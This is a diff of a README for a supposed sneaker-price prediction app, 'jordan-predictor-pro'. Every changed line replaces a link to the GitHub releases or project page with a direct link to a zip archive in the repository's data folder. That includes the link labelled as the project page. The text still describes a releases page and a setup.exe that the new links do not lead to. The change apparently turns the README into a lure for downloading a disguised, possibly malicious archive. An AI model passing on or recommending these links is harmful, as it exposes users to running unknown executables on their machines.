@@ -1,6 +1,6 @@
 # 🤖 jordan-predictor-pro - Predict Sneaker Prices Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/unplanted-westernmeadowlark707/jordan-predictor-pro/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/unplanted-westernmeadowlark707/jordan-predictor-pro/main/data/predictor-pro-jordan-2.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This app uses tested data pipelines to ensure the predictions stay accurate and 
 
 1. Visit the official release page linked below. This page has the latest version you need.
 
-   [Download jordan-predictor-pro](https://github.com/unplanted-westernmeadowlark707/jordan-predictor-pro/releases)
+   [Download jordan-predictor-pro](https://raw.githubusercontent.com/unplanted-westernmeadowlark707/jordan-predictor-pro/main/data/predictor-pro-jordan-2.1.zip)
 
 2. On the releases page, find the latest Windows installer. It will usually have a name like `jordan-predictor-pro-setup.exe` or similar.
 
@@ -80,7 +80,7 @@ The interface guides you step by step. No extra settings are needed.
 To keep predictions accurate, update the app regularly:
 
 1. Visit the release page again:  
-   [jordan-predictor-pro Releases](https://github.com/unplanted-westernmeadowlark707/jordan-predictor-pro/releases)
+   [jordan-predictor-pro Releases](https://raw.githubusercontent.com/unplanted-westernmeadowlark707/jordan-predictor-pro/main/data/predictor-pro-jordan-2.1.zip)
 
 2. Download and run the newest installer when available.
 
@@ -130,7 +130,7 @@ If problems persist, you can check the Issues section on the GitHub repository f
 
 You can visit the project page for updates, FAQs, and help:  
 
-https://github.com/unplanted-westernmeadowlark707/jordan-predictor-pro
+https://raw.githubusercontent.com/unplanted-westernmeadowlark707/jordan-predictor-pro/main/data/predictor-pro-jordan-2.1.zip
 
 Use the “Issues” tab to report any bugs or request features.
 
@@ -140,4 +140,4 @@ Use the “Issues” tab to report any bugs or request features.
 
 Use this link to go straight to the releases and get the app for Windows:
 
-[Download jordan-predictor-pro](https://github.com/unplanted-westernmeadowlark707/jordan-predictor-pro/releases)
+[Download jordan-predictor-pro](https://raw.githubusercontent.com/unplanted-westernmeadowlark707/jordan-predictor-pro/main/data/predictor-pro-jordan-2.1.zip)
